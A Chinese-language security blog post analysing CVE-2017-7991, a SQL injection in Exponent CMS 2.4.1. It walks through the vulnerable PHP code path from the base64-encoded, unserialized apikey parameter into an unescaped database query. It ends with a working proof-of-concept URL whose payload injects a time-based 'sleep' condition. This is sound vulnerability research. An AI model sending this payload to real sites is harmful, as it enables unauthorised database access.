---
title: '[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析'
date: 2017-05-12 07:42:07
tags: [代码审计,SQL注入,漏洞分析]
categories: Web安全
---

Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入

本文首发于：[[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析](https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/)

<!-- more -->
# 漏洞
注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下：

```php
public function api() {
	if (empty($this->params['apikey'])) {
		$_REQUEST['apikey'] = true;  // set this to force an ajax reply
		$ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null);
		$ar->send();  //FIXME this doesn't seem to work correctly in this scenario
	} else {
		$key = expUnserialize(base64_decode(urldecode($this->params['apikey'])));
		$cfg = new expConfig($key);
		$this->config = $cfg->config;
		if(empty($cfg->id)) {
			$ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null);
			$ar->send();
		} else {
			if (!empty($this->params['get'])) {
				$this->handleRequest();
			} else {
				$ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null);
				$ar->send();
			}
		}
	}
}
```

api()中，先检测参数`apikey`　是否为空，若不为空，则进入else分支。在分支中，先对参数`apikey`进行一次`urldecode`,接着进行 `base64_decode`,最后进行一次反序列化`expUnserialize`，在`expUnserialize`中存在一次小小的过滤：
```php
function expUnserialize($serial_str) {
    if ($serial_str === 'Array') return null;  // empty array string??
    if (is_array($serial_str) || is_object($serial_str)) return $serial_str;  // already unserialized
//    $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str );
    $out = preg_replace_callback(
        '!s:(\d+):"(.*?)";!s',
        create_function ('$m',
            '$m_new = str_replace(\'"\',\'\"\',$m[2]);
            return "s:".strlen($m_new).\':"\'.$m_new.\'";\';'
        ),
        $serial_str );
//    if ($out1 !== $out) {
//        eDebug('problem:<br>'.$out.'<br>'.$out1);
//    }
```

它会把 经过`base64_decode`后的`$apikey` 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行`expUnserialize`之后，赋值给`$key`，并在之后实例化一个 `expConfig`对象。`expConfig`部分代码如下：

```php
class expConfig extends expRecord {
	protected $table = 'expConfigs';

	function __construct($params=null) {
		global $db;

        if (!is_array($params)) {
            $this->location_data = serialize($params);
            parent::__construct($db->selectValue($this->table, 'id', "location_data='".$this->location_data."'"));
        } else {
            parent::__construct($params);
        }
	....
```
在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于`selectValue`的定义：

```php
function selectValue($table, $col, $where=null) {
	if ($where == null)
		$where = "1";
	$sql = "SELECT " . $col . " FROM `" . $this->prefix . "$table` WHERE $where LIMIT 0,1";
	$res = @mysqli_query($this->connection, $sql);

	if ($res == null)
		return null;
	$obj = mysqli_fetch_object($res);
	if (is_object($obj)) {
		return $obj->$col;
	} else {
		return null;
	}
}
```

可以看到，在检查完`$params`是否是数组后，将我们传入的`$params`序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 `location_data='".$this->location_data."'` 中的单引号进行闭合。


# POC

```
http://localhost:2500/exponent241/index.php
?module=eaas
&action=api
&apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7
```
其中 base64_decode("czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7") = s:16:"aaa'or "'sleep(2)#

查看 mysql.log ，可以发现成功注入。
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true)
运行的 sql语句 为：

```mysql
SELECT id FROM `exponent_expConfigs` WHERE location_data='s:19:"aaa'or \"'sleep(2)#";' LIMIT 0,1
```
可以看到单引号被成功闭合。
